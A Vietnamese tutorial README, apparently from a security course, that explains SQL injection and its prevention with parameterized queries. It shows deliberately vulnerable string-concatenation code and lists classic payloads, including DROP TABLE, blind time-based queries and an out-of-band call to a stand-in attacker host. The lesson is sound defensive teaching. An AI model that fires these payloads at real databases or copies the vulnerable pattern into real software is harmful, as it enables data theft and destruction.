# 💉 9.7 SQL Injection (Khai Thác & Phòng Chống)

> **SQL injection** xảy ra khi input user bị nối thẳng vào câu SQL — attacker biến **data thành code**. Phòng chống duy nhất đúng: **parameterized queries** — không bao giờ nối chuỗi SQL.

---

## 🎯 Vấn đề

Nối chuỗi trông vô hại nhưng là cửa sau cho attacker:

```typescript
// ❌ VULNERABLE
const sql = `SELECT * FROM users WHERE id = '${userInput}'`;
// userInput = '1' OR '1'='1' → trả về TOÀN BỘ users!
// userInput = ''; DROP TABLE users; -- → xóa bảng!
```

OWASP A03: injection vẫn top 3 sau 20 năm vì quá dễ mắc.

---

## 💻 Code ví dụ

Mô phỏng query builder vulnerable vs safe (parameterized).

```typescript
// Xem đầy đủ trong examples/index.ts — Chạy: npx ts-node examples/index.ts

// ❌ Nối chuỗi: input điều khiển được cấu trúc SQL
function vulnerable(id: string): string {
  return `SELECT * FROM users WHERE id = '${id}'`;
}
vulnerable("1' OR '1'='1"); // → SELECT ... WHERE id = '1' OR '1'='1' 💥

// ✅ Parameterized: input LUÔN là data, DB tự escape
function safe(): { sql: string; params: unknown[] } {
  return { sql: "SELECT * FROM users WHERE id = ?", params: ["1' OR '1'='1"] };
}
// DB tìm user có id đúng bằng chuỗi đó → 0 rows, không vỡ ✅
```

---

## ✅ Lợi Ích

| Lợi ích | Giải thích |
|---|---|
| Triệt tiêu SQLi | Placeholder `?/$1` tách code khỏi data ở tầng protocol — attacker không thể "thoát" ra khỏi data |
| Rõ ràng + nhanh | Query plan cache được theo template; code đọc rõ input nào đi đâu |
| Miễn phí với ORM | Prisma/TypeORM/Sequelize đều parameterized mặc định — chỉ vỡ khi dùng `raw()` nối chuỗi |

---

## ⚠️ Lưu Ý

- Payloads phổ biến phải nhận ra: `' OR '1'='1`, `'; DROP TABLE--`, `UNION SELECT`, `SLEEP(5)` (blind), `information_schema` enumeration.
- Tên bảng/cột **không parameterize được** → dùng allowlist map (`sort=price` → `ORDER BY price`), không bao giờ nhận tên cột từ user.
- `LIKE` có wildcard `%/_`: escape riêng. Second-order injection: data đã lưu DB vẫn phải parameterized khi query lại.
- Defense in depth: least-privilege DB user (app không có quyền DROP), WAF chỉ là lớp phụ.

---

## 🕵️ 2nd-Order SQL Injection

Input độc **không tấn công lúc nhập — được lưu an toàn — rồi tấn công ở query khác** khi được đọc ra và nối chuỗi:

```
1. Signup: username = admin'--            → parameterized, lưu an toàn vào DB ✅
2. Login:  SELECT ... WHERE user = 'admin'--' AND pw = '...'
           (username đọc từ DB, nối thẳng vào SQL lần 2) 💥
```

- Đây là lý do "đã parameterize khi INSERT" là **chưa đủ** — mọi data đọc từ DB cũng phải được coi là untrusted khi dùng lại.
- ORM raw query + string concat với data từ DB là lỗi 2nd-order kinh điển.
- Phòng chống: parameterized **ở mọi query**, kể cả query dùng data từ DB — không có ngoại lệ "data nội bộ".

## 🙈 Blind SQL Injection

Trang không hiện error hay data trả về — attacker vẫn khai thác qua **tín hiệu phụ**:

| Loại | Tín hiệu | Payload ví dụ |
|---|---|---|
| **Boolean-based** | Nội dung trang khác nhau theo điều kiện đúng/sai | `' AND (SELECT COUNT(*) FROM users)>0--` |
| **Time-based** | Response chậm khi điều kiện đúng | `'; IF(1=1) WAITFOR DELAY '0:0:5'--` / `SLEEP(5)` |
| **Out-of-band (OAST)** | Server chủ động kết nối ra DNS/HTTP của attacker | `; EXEC master..xp_dirtree '//attacker.com'` |

- Attacker đoán từng ký tự dữ liệu qua hàng nghìn request — chậm nhưng **bypass được mọi trang lỗi được ẩn**.
- `SLEEP(5)` trong ⚠️ Lưu Ý ở trên chính là dấu hiệu time-based blind — thấy query chậm bất thường + input user trong SQL = nghiêm trọng.
- Phòng chống giống SQLi thường (parameterized) — vì nó cùng gốc: nối chuỗi.

## 🧨 ORM vẫn dính SQLi: raw query + string concat

ORM parameterize mặc định, nhưng **mọi escape hatch đều mở cửa SQLi trở lại**:

```typescript
// Prisma
prisma.$queryRaw(`SELECT * FROM users WHERE name = '${name}'`);        // ❌ concat
prisma.$queryRaw`SELECT * FROM users WHERE name = ${name}`;            // ✅ tagged template tự parameterize
prisma.$queryRawUnsafe(userControlledSql);                              // ❌ nguy hiểm nhất

// TypeORM / Sequelize tương tự
repo.query(`... WHERE name = '${name}'`);        // ❌
repo.query("... WHERE name = $1", [name]);       // ✅
```

- **Audit checklist**: grep mọi `raw`/`query`/`queryRawUnsafe`/template literal chứa `${}` — đây là các điểm dính SQLi trong codebase "đã dùng ORM".
- Đừng bao giờ xây chuỗi SQL từ user input, kể cả sau khi "escape" bằng tay — escape bằng tay sai ở charset/encoding.

---

## 🎯 Khi nào dùng

- Mọi query có input từ user: login, search, filter, sort, pagination — không ngoại lệ.
- Audit: grep `+` nối chuỗi trong SQL, mọi `queryRaw`/template literal chứa `${}`.

---

## 🔗 Liên quan

- **9.1 OWASP Top 10** — injection (A03) và cách xếp hạng.
- **9.4 XSS & CSRF** — cùng gốc "tin input": encode output thay vì nối HTML.
- **10.1 SQL Basics** — viết SELECT/JOIN đúng trước khi bảo vệ nó.

---

## 📚 Tài liệu

- OWASP SQL Injection — https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- PortSwigger SQLi Labs — https://portswigger.net/web-security/sql-injection
- Bobby Tables — https://bobby-tables.com/

---

## ▶️ Chạy ví dụ

```bash
cd 09-security/9.7-sql-injection
npx ts-node examples/index.ts
```

Demo: 4 payloads kinh điển qua builder vulnerable (đều đổi cấu trúc SQL) vs safe builder (đều thành data vô hại).

---

## ⏭️ Bài tiếp theo

→ [9.8 Password Hashing](../9.8-password-hashing/README.md)
